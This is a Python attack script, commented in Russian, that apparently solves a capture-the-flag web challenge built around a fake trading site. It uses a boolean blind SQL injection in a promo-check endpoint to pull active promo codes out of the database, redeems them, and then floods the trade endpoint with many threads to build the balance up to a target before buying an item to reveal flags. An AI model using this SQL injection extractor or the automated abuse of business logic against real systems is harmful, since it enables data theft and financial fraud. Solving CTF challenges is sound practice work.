#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Momentum2 — одна кнопка. ТОЛЬКО stdlib, ставить ничего не надо.

    python3 go.py login m2e0s7xwwlt    # войти в существующий аккаунт
    python3 go.py probe                # какие промокоды живые
    python3 go.py prep                 # войти/создать аккаунт + активировать промокод
    python3 go.py go                   # prep + замер скорости + гринд до 250000 + покупка
    python3 go.py go 96                # то же, но 96 потоков

Вывод намеренно без символа рубля и без эмодзи — чтобы не падало на Windows-консоли.
Аккаунт сохраняется в account.json рядом со скриптом, поэтому баланс не теряется.
"""

import os
import re
import sys
import json
import time
import random
import string
import socket
import ssl
import threading
import http.client
import urllib.parse

VERSION = "go-1"                      # <-- видно в первой строке вывода
BASE = os.environ.get(
    "M2_BASE",
    "https://4fc999215e4d4971.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
U = urllib.parse.urlsplit(BASE)
HOST, PORT = U.hostname, U.port or 443
TLS = U.scheme == "https"
GOAL = 250000                         # рублей
PASS = "Pa55word!x"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
HERE = os.path.dirname(os.path.abspath(__file__))
ACC = os.path.join(HERE, "account.json")

COOKIE = ""
LCK = threading.Lock()

try:
    sys.stdout.reconfigure(errors="replace")
except Exception:
    pass


def say(*a):
    print(*a)
    sys.stdout.flush()


# ------------------------------------------------------------------ http

def uesc(s):
    return re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)


def strip(s):
    s = uesc(s)
    s = re.sub(r"<script.*?</script>", " ", s, flags=re.S | re.I)
    s = re.sub(r"<[^>]+>", " ", s)
    return re.sub(r"\s+", " ", s).strip()


def conn(timeout=30):
    if TLS:
        return http.client.HTTPSConnection(HOST, PORT, timeout=timeout,
                                           context=ssl.create_default_context())
    return http.client.HTTPConnection(HOST, PORT, timeout=timeout)


def raw(method, path, body=None, cookie=None, timeout=30):
    c = conn(timeout)
    h = {"Host": HOST, "User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if cookie:
        h["Cookie"] = cookie
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        return r.status, r.read().decode("utf-8", "replace"), r.getheaders()
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e), []
    finally:
        try:
            c.close()
        except Exception:
            pass


def req(method, path, data=None, timeout=30):
    global COOKIE
    body = urllib.parse.urlencode(data) if data is not None else None
    st, txt, hdr = raw(method, path, body, COOKIE, timeout)
    jar = {}
    for part in COOKIE.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            jar[k] = v
    for k, v in hdr:
        if k.lower() == "set-cookie":
            first = v.split(";", 1)[0]
            if "=" in first:
                n, val = first.split("=", 1)
                jar[n.strip()] = val.strip()
    COOKIE = "; ".join("%s=%s" % (k, v) for k, v in jar.items())
    return st, txt


def balance():
    _, p = req("GET", "/profile")
    m = re.search(r"([\d][\d\s\u00a0]{0,14})\s*(?:\u20bd|руб)", strip(p))
    return int(re.sub(r"\D", "", m.group(1)) or 0) if m else 0


# ------------------------------------------------------------------ аккаунт

def save(user):
    try:
        with open(ACC, "w", encoding="utf-8") as f:
            json.dump({"user": user, "pass": PASS, "cookie": COOKIE}, f)
    except Exception:
        pass


def saved():
    try:
        with open(ACC, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def do_login(user, pw=None):
    global COOKIE
    pw = pw or saved().get("pass") or PASS
    COOKIE = ""
    req("GET", "/logout")
    st, _ = req("POST", "/login", {"username": user, "password": pw})
    _, p = req("GET", "/profile")
    ok = user in uesc(p)
    b = balance()
    say("  login %s -> %s | в профиле: %s | баланс %d rub" % (user, st, "ДА" if ok else "НЕТ", b))
    if ok:
        save(user)
    return ok, b


def do_register():
    global COOKIE
    COOKIE = ""
    req("GET", "/logout")
    user = "g" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    req("POST", "/register", {"username": user, "password": PASS})
    ok, b = do_login(user)
    if not ok:
        say("  !! регистрация не удалась")
    return ok, b, user


def ensure_account(want=None):
    """Войти в нужный/сохранённый аккаунт, иначе создать новый."""
    if want:
        ok, b = do_login(want)
        if ok:
            return want, b
        say("  !! не вошёл, пробую сохранённый")
    s = saved().get("user")
    if s:
        ok, b = do_login(s)
        if ok:
            return s, b
    ok, b, user = do_register()
    return user, b


# ------------------------------------------------------------------ промо

def oracle(sql, tries=3):
    p = "/api/v1/promo/check?code=" + urllib.parse.quote("' OR (" + sql + ")--")
    for _ in range(tries):
        st, rawt = req("GET", p)
        if st == 200:
            try:
                return bool(json.loads(rawt).get("available"))
            except Exception:
                m = re.search(r'"available"\s*:\s*(true|false)', rawt)
                if m:
                    return m.group(1) == "true"
        time.sleep(0.15)
    return None


CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_@|:-./"


def _len(expr, hi=6000):
    e = "length(ifnull((%s),''))" % expr
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle("%s>=%d" % (e, mid))
        if v is None:
            return None
        lo, hi = (mid, hi) if v else (lo, mid - 1)
    return lo


def _chr(expr, i):
    idx = "instr('%s',substr(ifnull((%s),''),%d,1))" % (CHARS, expr, i)
    if not oracle("%s>=1" % idx):
        lo, hi = 0, 0x2FFFF
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if oracle("unicode(substr(ifnull((%s),''),%d,1))>=%d" % (expr, i, mid)):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)
    lo, hi = 1, len(CHARS)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle("%s>=%d" % (idx, mid)):
            lo = mid
        else:
            hi = mid - 1
    return CHARS[lo - 1]


def _str(expr):
    n = _len(expr)
    if not n:
        return ""
    return "".join(_chr(expr, i) for i in range(1, n + 1))


def live_codes():
    say("  смотрю промокоды (blind SQLi)...")
    d = _str("SELECT group_concat(code||'@'||uses_left,'|') FROM promos WHERE uses_left>0")
    out = []
    for part in (d or "").split("|"):
        if "@" in part:
            c, u = part.rsplit("@", 1)
            try:
                out.append((c, int(u)))
            except ValueError:
                pass
    for c, u in out:
        say("    %-14s uses_left=%d" % (c, u))
    if not out:
        say("    живых кодов нет")
    return out


def prep():
    """Гарантировать аккаунт с деньгами (промокод присваивает 10000, поэтому только если мало)."""
    user, b = ensure_account(WANT)
    if b < 10000:
        for c, _ in live_codes():
            st, t = req("POST", "/promo/redeem", {"code": c})
            d = uesc(t)
            say("  redeem %s -> %s %s" % (c, st, strip(d)[:80]))
            if '"credited"' in d:
                break
        b = balance()
        say("  баланс после промо: %d rub" % b)
    else:
        say("  промо не трогаю: на счету уже %d rub (redeem ПРИСВАИВАЕТ 10000 и обнулил бы)" % b)
    return user, b


# ------------------------------------------------------------------ торговля

def trade_worker(stop, st, keepalive=True):
    c = conn(30)
    body = urllib.parse.urlencode({"asset": "RUB/USD", "direction": "up",
                                   "amount": "1", "multiplier": "1.01"})
    hdr = {"Host": HOST, "Content-Type": "application/x-www-form-urlencoded",
           "Cookie": COOKIE, "User-Agent": UA, "Accept": "*/*"}
    while not stop.is_set():
        try:
            if c.sock is None:
                c.connect()
            c.request("POST", "/trade", body=body, headers=hdr)
            r = c.getresponse()
            d = r.read().decode("utf-8", "replace")
            if not keepalive:
                c.close()
            try:
                j = json.loads(uesc(d))
            except Exception:
                j = {}
            if "won" not in j:
                e = str(j.get("error") or strip(d)[:60])
                with LCK:
                    st["err"][e] = st["err"].get(e, 0) + 1
                low = e.lower()
                if "средств" in low or "войд" in low or "сумм" in low:
                    stop.set()
                time.sleep(0.05)
                continue
            with LCK:
                st["trades"] += 1
                if j.get("won"):
                    st["wins"] += 1
                bl = j.get("balance")
                if isinstance(bl, int):
                    bl //= 100
                    if bl > st["peak"]:
                        st["peak"] = bl
                    if bl >= GOAL:
                        stop.set()
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            c = conn(30)
            time.sleep(0.03)


def measure(threads=64, seconds=15):
    st = {"trades": 0, "wins": 0, "peak": 0, "err": {}}
    stop = threading.Event()
    b0 = balance()
    ts = [threading.Thread(target=trade_worker, args=(stop, st), daemon=True) for _ in range(threads)]
    t0 = time.time()
    for t in ts:
        t.start()
    time.sleep(seconds)
    stop.set()
    for t in ts:
        t.join(5)
    el = max(0.001, time.time() - t0)
    b1 = balance()
    say("  %d потоков | %.1f с | сделок %d | %.0f сд/с | +%d rub"
        % (threads, el, st["trades"], st["trades"] / el, b1 - b0))
    if st["err"]:
        say("  ошибки: %s" % sorted(st["err"].items(), key=lambda x: -x[1])[:3])
    return st["trades"] / el, b1


def grind(threads=64, seconds=7200):
    st = {"trades": 0, "wins": 0, "peak": 0, "err": {}}
    stop = threading.Event()
    b0 = balance()
    st["peak"] = b0
    say("")
    say("=" * 66)
    say("ГРИНД: 1 rub за сделку | старт %d rub | цель %d rub | %d потоков" % (b0, GOAL, threads))
    say("=" * 66)
    ts = [threading.Thread(target=trade_worker, args=(stop, st), daemon=True) for _ in range(threads)]
    t0 = time.time()
    for t in ts:
        t.start()
    while not stop.is_set() and time.time() - t0 < seconds:
        time.sleep(10)
        el = time.time() - t0
        b = balance()
        rate = st["trades"] / el if el else 0
        left = max(0, GOAL - b)
        eta = (left / (rate * 1.0)) if rate > 0 else -1
        say("  %5.0f с | сделок %7d | %5.1f сд/с | %6d rub | осталось %6d | ETA %s"
            % (el, st["trades"], rate, b, left,
               ("%.0f мин" % (eta / 60)) if eta > 0 else "?"))
        if b >= GOAL:
            stop.set()
        if st["err"]:
            say("       ошибки: %s" % sorted(st["err"].items(), key=lambda x: -x[1])[:2])
    stop.set()
    for t in ts:
        t.join(5)
    return balance()


def buy():
    st, t = req("POST", "/profile/buy")
    say("")
    say("POST /profile/buy -> %s" % st)
    f = re.findall(r"flag\{[^}]+\}", uesc(t))
    say("ФЛАГИ: %s" % f)
    m = re.search(r"(элит\w*[^.]{0,240}|код участника[^.]{0,240})", strip(t), re.I)
    say("текст: %s" % (m.group(1) if m else strip(t)[:240]))
    return f


# ------------------------------------------------------------------ main

WANT = None


def main():
    global WANT
    args = sys.argv[1:]
    mode = args[0] if args else "go"
    nums = [int(a) for a in args if a.isdigit()]
    words = [a for a in args[1:] if not a.isdigit()]
    threads = nums[0] if nums else 64

    say("go.py %s | режим=%s | %s" % (VERSION, mode, BASE))

    if mode == "login":
        if not words:
            s = saved().get("user")
            if not s:
                say("нужно имя: python3 go.py login <username>")
                return
            words = [s]
        WANT = words[0]
        do_login(WANT)
        return

    if mode == "probe":
        live_codes()
        return

    if mode in ("prep", "go"):
        user, b = prep()
        say("  аккаунт: %s | баланс: %d rub" % (user, b))
        if mode == "prep":
            return
        rate, b = measure(threads)
        if b >= GOAL:
            buy()
            return
        left = GOAL - b
        if rate > 0:
            say("  прогноз: %d rub при %.0f сд/с = %.0f мин" % (left, rate, left / rate / 60))
        b = grind(threads)
        if b >= GOAL:
            buy()
        else:
            say("  итог: %d rub, не хватило %d" % (b, max(0, GOAL - b)))
        return

    say("неизвестный режим: %s" % mode)
    say("варианты: login <user> | probe | prep | go [потоки]")


if __name__ == "__main__":
    main()
